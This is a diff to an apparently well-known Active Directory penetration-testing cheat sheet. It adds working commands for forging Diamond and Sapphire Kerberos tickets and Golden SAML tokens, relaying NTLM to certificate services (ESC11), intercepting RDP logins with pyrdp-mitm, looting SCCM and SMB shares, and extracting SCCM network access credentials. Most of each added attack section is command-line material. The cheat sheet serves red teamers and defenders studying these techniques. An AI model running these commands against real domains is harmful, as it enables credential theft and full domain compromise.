@@ -40,6 +40,7 @@
       - [Using Mimikatz DCSync](#using-mimikatz-dcsync)
       - [Using Mimikatz sekurlsa](#using-mimikatz-sekurlsa)
       - [Crack NTLM hashes with hashcat](#crack-ntlm-hashes-with-hashcat)
+      - [NTDS Reversible Encryption](#ntds-reversible-encryption)
     - [User Hunting](#user-hunting)
     - [Password spraying](#password-spraying)
       - [Kerberos pre-auth bruteforcing](#kerberos-pre-auth-bruteforcing)
@@ -56,6 +57,8 @@
       - [Using Meterpreter](#using-meterpreter)
       - [Using a ticket on Linux](#using-a-ticket-on-linux)
     - [Pass-the-Ticket Silver Tickets](#pass-the-ticket-silver-tickets)
+    - [Pass-the-Ticket Diamond Tickets](#pass-the-ticket-diamond-tickets)
+    - [Pass-the-Ticket Sapphire Tickets](#pass-the-ticket-sapphire-tickets)
     - [Kerberoasting](#kerberoasting)
     - [KRB_AS_REP Roasting](#krbasrep-roasting)
     - [Pass-the-Hash](#pass-the-hash)
@@ -82,8 +85,11 @@
       - [ESC7 - Vulnerable Certificate Authority Access Control](#esc7---vulnerable-certificate-authority-access-control)
       - [ESC8 - AD CS Relay Attack](#esc8---ad-cs-relay-attack)
       - [ESC9 - No Security Extension](#esc9---no-security-extension)
+      - [ESC11 - Relaying NTLM to ICPR](#esc11---relaying-ntlm-to-icpr)
       - [Certifried CVE-2022-26923](#certifried-cve-2022-26923)
       - [Pass-The-Certificate](#pass-the-certificate)
+    - [Active Directory Federation Services](#active-directory-federation-services)
+      - [ADFS - Golden SAML](#adfs---golden-saml)
     - [UnPAC The Hash](#unpac-the-hash)
     - [Shadow Credentials](#shadow-credentials)
     - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
@@ -114,6 +120,7 @@
     - [PrivExchange attack](#privexchange-attack)
     - [SCCM Deployment](#sccm-deployment)
     - [SCCM Network Access Accounts](#sccm-network-access-accounts)
+    - [SCCM Shares](#sccm-shares)
     - [WSUS Deployment](#wsus-deployment)
     - [RODC - Read Only Domain Controller Compromise](#rodc---read-only-domain-controller-compromise)
     - [PXE Boot image attack](#pxe-boot-image-attack)
@@ -221,18 +228,11 @@
 Use the correct collector
 * AzureHound for Azure Active Directory
 * SharpHound for local Active Directory
+* RustHound for local Active Directory
 
-* use [AzureHound](https://posts.specterops.io/introducing-bloodhound-4-0-the-azure-update-9b2b26c5e350)
-  ```powershell
-  # require: Install-Module -name Az -AllowClobber
-  # require: Install-Module -name AzureADPreview -AllowClobber
-  Connect-AzureAD
-  Connect-AzAccount
-  . .\AzureHound.ps1
-  Invoke-AzureHound
-  ```
+* use [BloodHoundAD/AzureHound](https://github.com/BloodHoundAD/AzureHound) (more info: [Cloud - Azure Pentest](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest.md#azure-recon-tools))
 
-* use [BloodHound](https://github.com/BloodHoundAD/BloodHound)
+* use [BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)
   ```powershell
   # run the collector on the machine using SharpHound.exe
   # https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
@@ -255,12 +255,26 @@ Use the correct collector
   # https://github.com/fox-it/BloodHound.py
   pip install bloodhound
   bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all
+  
+  # or locally/remotely from an ADExplorer snapshot from SysInternals (ADExplorer remains a legitimate binary signed by Microsoft, avoiding detection with security solutions)
+  # https://github.com/c3c/ADExplorerSnapshot.py
+  pip3 install --user .
+  ADExplorerSnapshot.py <snapshot path> -o <*.json output folder path>
   ```
 * Collect more data for certificates exploitation using Certipy
   ```ps1
   certipy find 'corp.local/john:Passw0rd@dc.corp.local' -bloodhound
   certipy find 'corp.local/john:Passw0rd@dc.corp.local' -old-bloodhound
   certipy find 'corp.local/john:Passw0rd@dc.corp.local' -vulnerable -hide-admins -username user@domain -password Password123
+  ```
+* use [OPENCYBER-FR/RustHound](https://github.com/OPENCYBER-FR/RustHound)
+  ```ps1
+  # Windows with GSSAPI session
+  rusthound.exe -d domain.local --ldapfqdn domain
+  # Windows/Linux simple bind connection username:password
+  rusthound.exe -d domain.local -u user@domain.local -p Password123 -o output -z
+  # Linux with username:password and ADCS module for @ly4k BloodHound version
+  rusthound -d domain.local -u 'user@domain.local' -p 'Password123' -o /tmp/adcs --adcs -z
   ```
 
 Then import the zip/json files into the Neo4J database and query them.
@@ -481,24 +495,27 @@ Replace the customqueries.json file located at `/home/username/.config/bloodhoun
 
 This exploit require to know the user SID, you can use `rpcclient` to remotely get it or `wmi` if you have an access on the machine.
 
-```powershell
-# remote
-rpcclient $> lookupnames john.smith
-john.smith S-1-5-21-2923581646-3335815371-2872905324-1107 (User: 1)
-
-# loc
-wmic useraccount get name,sid
-Administrator  S-1-5-21-3415849876-833628785-5197346142-500   
-Guest          S-1-5-21-3415849876-833628785-5197346142-501   
-Administrator  S-1-5-21-297520375-2634728305-5197346142-500   
-Guest          S-1-5-21-297520375-2634728305-5197346142-501   
-krbtgt         S-1-5-21-297520375-2634728305-5197346142-502   
-lambda         S-1-5-21-297520375-2634728305-5197346142-1110 
-
-# powerview
-Convert-NameToSid high-sec-corp.localkrbtgt
-S-1-5-21-2941561648-383941485-1389968811-502
-```
+* RPCClient
+  ```powershell
+  rpcclient $> lookupnames john.smith
+  john.smith S-1-5-21-2923581646-3335815371-2872905324-1107 (User: 1)
+  ```
+* WMI
+  ```powershell
+  wmic useraccount get name,sid
+  Administrator  S-1-5-21-3415849876-833628785-5197346142-500   
+  Guest          S-1-5-21-3415849876-833628785-5197346142-501   
+  Administrator  S-1-5-21-297520375-2634728305-5197346142-500   
+  Guest          S-1-5-21-297520375-2634728305-5197346142-501   
+  krbtgt         S-1-5-21-297520375-2634728305-5197346142-502   
+  lambda         S-1-5-21-297520375-2634728305-5197346142-1110 
+  ```
+* Powerview
+  ```powershell
+  Convert-NameToSid high-sec-corp.localkrbtgt
+  S-1-5-21-2941561648-383941485-1389968811-502
+  ```
+* CrackMapExec: `crackmapexec ldap DC1.lab.local -u username -p password -k --get-sid`  
 
 ```bash
 Doc: https://github.com/gentilkiwi/kekeo/wiki/ms14068
@@ -841,7 +858,7 @@ Automated exploitation:
 
 > Some shares can be accessible without authentication, explore them to find some juicy files
 
-* [smbmap](https://github.com/ShawnDEvans/smbmap)
+* [ShawnDEvans/smbmap - a handy SMB enumeration tool](https://github.com/ShawnDEvans/smbmap)
   ```powershell
   smbmap -H 10.10.10.10                # null session
   smbmap -H 10.10.10.10 -R             # recursive listing
@@ -849,7 +866,7 @@ Automated exploitation:
   smbmap -H 10.10.10.10 -d "DOMAIN.LOCAL" -u "USERNAME" -p "Password123*"
   ```
 
-* [pth-smbclient from path-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
+* [byt3bl33d3r/pth-smbclient from path-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
   ```powershell
   pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/Share
   pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/C$
@@ -859,7 +876,7 @@ Automated exploitation:
   put # replace a file
   ```
 
-* [smbclient from Impacket](https://github.com/SecureAuthCorp/impacket)
+* [SecureAuthCorp/smbclient from Impacket](https://github.com/SecureAuthCorp/impacket)
   ```powershell
   smbclient -I 10.10.10.100 -L ACTIVE -N -U ""
           Sharename       Type      Comment
@@ -888,6 +905,22 @@ Automated exploitation:
   smb: \> lcd '/path/to/go/'
   smb: \> mget *
   ```
+
+
+* [SnaffCon/Snaffler - a tool for pentesters to help find delicious candy](https://github.com/SnaffCon/Snaffler)
+  ```ps1
+  snaffler.exe -s - snaffler.log
+
+  # Snaffle all the computers in the domain
+  ./Snaffler.exe -d domain.local -c <DC> -s
+
+  # Snaffle specific computers
+  ./Snaffler.exe -n computer1,computer2 -s
+  ​
+  # Snaffle a specific directory
+  ./Snaffler.exe -i C:\ -s
+  ```
+
 
 ### SCF and URL file attack against writeable share
 
@@ -1312,6 +1345,22 @@ $ python2 maskgen.py hashcat.mask --targettime 3600 --optindex -q -o hashcat_1H.
 - [crackstation.net](https://crackstation.net)
 - [hashes.com](https://hashes.com/en/decrypt/hash)
 
+
+#### NTDS Reversible Encryption
+
+`UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED` ([0x00000080](http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm)), if this bit is set, the password for this user stored encrypted in the directory - but in a reversible form.
+
+The key used to both encrypt and decrypt is the SYSKEY, which is stored in the registry and can be extracted by a domain admin.
+This means the hashes can be trivially reversed to the cleartext values, hence the term “reversible encryption”.
+
+* List users with "Store passwords using reversible encryption" enabled
+    ```powershell
+    Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+    ```
+
+The password retrieval is already handled by [SecureAuthCorp/secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) and mimikatz, it will be displayed as CLEARTEXT. 
+
+
 ### User Hunting
 
 Sometimes you need to find a machine where a specific user is logged in.    
@@ -1577,6 +1626,8 @@ Add-DomainGroupMember -Identity 'LAPS READ' -Members 'user1' -Credential $cred -
 
 > One notable difference between a **Golden Ticket** attack and the **Golden GMSA** attack is that they no way of rotating the KDS root key secret. Therefore, if a KDS root key is compromised, there is no way to protect the gMSAs associated with it.
 
+:warning: You can't "force reset" a gMSA password, because a gMSA's password never changes. The password is derived from the KDS root key and `ManagedPasswordIntervalInDays`, so every Domain Controller can at any time compute what the password is, what it used to be, and what it will be at any point in the future.
+
 * Using [GoldenGMSA](https://github.com/Semperis/GoldenGMSA)
     ```ps1
     # Enumerate all gMSAs
@@ -1600,9 +1651,11 @@ Add-DomainGroupMember -Identity 'LAPS READ' -Members 'user1' -Credential $cred -
 
 ### Pass-the-Ticket Golden Tickets
 
-Forging a TGT require the `krbtgt` NTLM hash
+Forging a TGT require:
+* the `krbtgt` NT hash
+* since recently, we cannot use a non-existent account name as a result of `CVE-2021-42287` mitigations
 
-> The way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt ntlm hash must be used.
+> The way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt NT hash must be used.
 
 #### Using Mimikatz
 
@@ -1702,6 +1755,38 @@ Interesting services to target with a silver ticket :
 
 Mitigations:
 * Set the attribute "Account is Sensitive and Cannot be Delegated" to prevent lateral movement with the generated ticket.
+
+
+### Pass-the-Ticket Diamond Tickets
+
+> Request a legit low-priv TGT and recalculate only the PAC field providing the krbtgt encryption key
+
+Require: 
+* krbtgt NT Hash
+* krbtgt AES key
+
+```ps1
+ticketer.py -request -domain 'lab.local' -user 'domain_user' -password 'password' -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'
+
+Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS
+```
+
+
+### Pass-the-Ticket Sapphire Tickets
+
+> Requesting the target user's PAC with `S4U2self+U2U` exchange during TGS-REQ(P) (PKINIT).
+
+The goal is to mimic the PAC field as close as possible to a legitimate one.
+
+Require:
+* [Impacket PR#1411](https://github.com/SecureAuthCorp/impacket/pull/1411)
+* krbtgt AES key
+
+```ps1
+# baduser argument will be ignored
+ticketer.py -request -impersonate 'domain_adm' -domain 'lab.local' -user 'domain_user' -password 'password' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' 'baduser'
+```
+
 
 ### Kerberoasting
 
@@ -1857,7 +1942,7 @@ The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since 
   set SMBUser jarrieta
   set SMBPass nastyCutt3r  
   # NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.
-  # NOTE2: Require the full NTLM hash, you may need to add the "blank" LM (aad3b435b51404eeaad3b435b51404ee)
+  # NOTE2: Require the full NT hash, you may need to add the "blank" LM (aad3b435b51404eeaad3b435b51404ee)
   set PAYLOAD windows/meterpreter/bind_tcp
   run
   shell
@@ -1888,7 +1973,7 @@ $ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 
 ### OverPass-the-Hash (pass the key)
 
-In this technique, instead of passing the hash directly, we use the NTLM hash of an account to request a valid Kerberost ticket (TGT).
+In this technique, instead of passing the hash directly, we use the NT hash of an account to request a valid Kerberost ticket (TGT).
 
 #### Using impacket
 
@@ -2219,13 +2304,28 @@ secretsdump.py -k -no-pass target.lab.local
     # IP of PC1: 10.0.0.4
     ```
 
+#### Man-in-the-middle RDP connections with pyrdp-mitm
+* https://github.com/GoSecure/pyrdp
+* https://www.gosecure.net/blog/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera/
+* Usage
+```sh
+pyrdp-mitm.py <IP>
+pyrdp-mitp.py <IP>:<PORT> # with custom port
+pyrdp-mitm.py <IP> -k private_key.pem -c certificate.pem # with custom key and certificate
+```
+* Exploitation
+  * If Network Level Authentication (NLA) is enabled, you will obtain the client's NetNTLMv2 challenge
+  * If NLA is disabled, you will obtain the password in plaintext
+  * Other features are available such as keystroke recording
+* Alternatives
+  * S3th: https://github.com/SySS-Research/Seth, performs ARP spoofing prior to launching the RDP listener	
 
 ### Active Directory Certificate Services
 
 * Find ADCS Server
   * `crackmapexec ldap domain.lab -u username -p password -M adcs`
   * `ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=<user>,OU=Users,DC=domain,DC=local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName`
-* Enumerate AD Enterprise CAs with certutil: `certutil.exe -config - -ping`
+* Enumerate AD Enterprise CAs with certutil: `certutil.exe -config - -ping`, `certutil -dump`
 
 #### ESC1 - Misconfigured Certificate Templates
 
@@ -2501,6 +2601,20 @@ Jane@corp.local is allowed to enroll in the certificate template ESC9 that speci
     # Add -domain <domain> to your command line since there is no domain specified in the certificate.
     ```
 
+#### ESC11 - Relaying NTLM to ICPR
+
+> Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
+
+Requirements:
+* [sploutchy/Certipy](https://github.com/sploutchy/Certipy) - Certipy fork
+* [sploutchy/impacket](https://github.com/sploutchy/impacket) - Impacket fork
+
+Exploitation:
+1. Look for `Enforce Encryption for Requests: Disabled` in `certipy find -u user@dc1.lab.local -p 'REDACTED' -dc-ip 10.10.10.10 -stdout` output
+2. Setup a relay using Impacket ntlmrelay and trigger a connection to it.
+    ```ps1
+    ntlmrelayx.py -t rpc://10.10.10.10 -rpc-mode ICPR -icpr-ca-name lab-DC-CA -smb2support
+    ```
 
 #### Certifried CVE-2022-26923
 
@@ -2574,6 +2688,46 @@ Jane@corp.local is allowed to enroll in the certificate template ESC9 that speci
   certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
   certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"
   ```
+
+### Active Directory Federation Services
+
+#### ADFS - Golden SAML
+
+**Requirements**:
+* ADFS service account
+* The private key (PFX with the decryption password)
+
+**Exploitation**:
+* Run [mandiant/ADFSDump](https://github.com/mandiant/ADFSDump) on AD FS server as the AD FS service account. It will query the Windows Internal Database (WID): `\\.\pipe\MICROSOFT##WID\tsql\query`
+* Convert PFX and Private Key to binary format
+    ```ps1
+    # For the pfx
+    echo AAAAAQAAAAAEE[...]Qla6 | base64 -d > EncryptedPfx.bin
+    # For the private key
+    echo f7404c7f[...]aabd8b | xxd -r -p > dkmKey.bin 
+    ```
+* Create the Golden SAML using [mandiant/ADFSpoof](https://github.com/mandiant/ADFSpoof), you might need to update the [dependencies](https://github.com/szymex73/ADFSpoof).
+    ```ps1
+    mkdir ADFSpoofTools
+    cd $_
+    git clone https://github.com/dmb2168/cryptography.git
+    git clone https://github.com/mandiant/ADFSpoof.git 
+    virtualenv3 venvADFSSpoof
+    source venvADFSSpoof/bin/activate
+    pip install lxml
+    pip install signxml
+    pip uninstall -y cryptography
+    cd cryptography
+    pip install -e .
+    cd ../ADFSpoof
+    pip install -r requirements.txt
+    python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.pentest.lab saml2 --endpoint https://www.contoso.com/adfs/ls
+    /SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid 'PENTEST\administrator' --rpidentifier Supervision --assertions '<Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"><AttributeValue>PENTEST\administrator</AttributeValue></Attribute>'
+    ```
+
+Other interesting tools to exploit AD FS: 
+* [WhiskeySAML](https://github.com/secureworks/whiskeysamlandfriends/tree/main/whiskeysaml)
+
 
 ### UnPAC The Hash
 
@@ -3591,15 +3745,27 @@ python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th 
     NetworkAccessPassword : <![CDATA[E600000001...8C6B5]]>
     NetworkAccessUsername : <![CDATA[E600000001...00F92]]>
     ```
-* Using [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI/blob/81e1fcdd44e04cf84ca0085cf5db2be4f7421903/SharpDPAPI/Commands/SCCM.cs#L208-L244) for SCCM retrieval and decryption
+* Using [GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI/blob/81e1fcdd44e04cf84ca0085cf5db2be4f7421903/SharpDPAPI/Commands/SCCM.cs#L208-L244) or [Mayyhem/SharpSCCM](https://github.com/Mayyhem/SharpSCCM) for SCCM retrieval and decryption
     ```ps1
     .\SharpDPAPI.exe SCCM
+    .\SharpSCCM.exe get naa -u USERNAME -p PASSWORD
     ```
 * Check ACL for the CIM repository located at `C:\Windows\System32\wbem\Repository\OBJECTS.DATA`:
     ```ps1
     Get-Acl C:\Windows\System32\wbem\Repository\OBJECTS.DATA | Format-List -Property PSPath,sddl
     ConvertFrom-SddlString ""
     ```
+
+### SCCM Shares
+
+> Find interesting files stored on (System Center) Configuration Manager (SCCM/CM) SMB shares
+
+* [1njected/CMLoot](https://github.com/1njected/CMLoot)
+  ```ps1
+  Invoke-CMLootInventory -SCCMHost sccm01.domain.local -Outfile sccmfiles.txt
+  Invoke-CMLootDownload -SingleFile \\sccm\SCCMContentLib$\DataLib\SC100001.1\x86\MigApp.xml
+  Invoke-CMLootDownload -InventoryFile .\sccmfiles.txt -Extension msi
+  ```
 
 
 ### WSUS Deployment
@@ -3862,7 +4028,7 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 ## References
 
 * [Explain like I’m 5: Kerberos - Apr 2, 2013 - @roguelynn](https://www.roguelynn.com/words/explain-like-im-5-kerberos/)
-* [Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter](#https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
+* [Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
 * [Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin)
 * [Abusing Kerberos: Kerberoasting - Haboob Team](https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf)
 * [Abusing S4U2Self: Another Sneaky Active Directory Persistence - Alsid](https://alsid.com/company/news/abusing-s4u2self-another-sneaky-active-directory-persistence)
@@ -3919,8 +4085,8 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [Playing with Relayed Credentials - June 27, 2018](https://www.secureauth.com/blog/playing-relayed-credentials)
 * [Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/)
 * [Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019](https://blog.preempt.com/drop-the-mic)
-* [How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous](https:/www.sqlshack.com/build-sql-server-virtual-lab-automatedlab-hyper-v/)
-* [SMB Share – SCF File Attacks - December 13, 2017 - @netbiosX](pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
+* [How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous](https://www.sqlshack.com/build-sql-server-virtual-lab-automatedlab-hyper-v/)
+* [SMB Share – SCF File Attacks - December 13, 2017 - @netbiosX](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
 * [Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
 * [A Red Teamer’s Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0](https://wald0.com/?p=179)
 * [Carlos Garcia - Rooted2019 - Pentesting Active Directory Forests public.pdf](https://www.dropbox.com/s/ilzjtlo0vbyu1u0/Carlos%20Garcia%20-%20Rooted2019%20-%20Pentesting%20Active%20Directory%20Forests%20public.pdf?dl=0)
@@ -3973,3 +4139,12 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [Shadow Credentials - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
 * [Network Access Accounts are evil… - ROGER ZANDER - 13 SEP 2015](https://rzander.azurewebsites.net/network-access-accounts-are-evil/)
 * [The Phantom Credentials of SCCM: Why the NAA Won’t Die - Duane Michael - Jun 28](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)
+* [Diamond tickets - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond)
+* [A Diamond (Ticket) in the Ruff - By CHARLIE CLARK July 05, 2022](https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/)
+* [Sapphire tickets - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire)
+* [Exploiting RBCD Using a Normal User Account - tiraniddo.dev - Friday, 13 May 2022](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
+* [Exploring SCCM by Unobfuscating Network Access Accounts - @_xpn_ - Posted on 2022-07-09](https://blog.xpnsec.com/unobfuscating-network-access-accounts/)
+* [.NET Advanced Code Auditing XmlSerializer Deserialization Vulnerability - April 2, 2019 by znlive](https://znlive.com/xmlserializer-deserialization-vulnerability)
+* [Practical guide for Golden SAML - Practical guide step by step to create golden SAML](https://nodauf.dev/p/practical-guide-for-golden-saml/)
+* [Relaying to AD Certificate Services over RPC - NOVEMBER 16, 2022 - SYLVAIN HEINIGER](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
+* [I AM AD FS AND SO CAN YOU - Douglas Bienstock & Austin Baker - Mandiant](https://troopers.de/downloads/troopers19/TROOPERS19_AD_AD_FS.pdf)
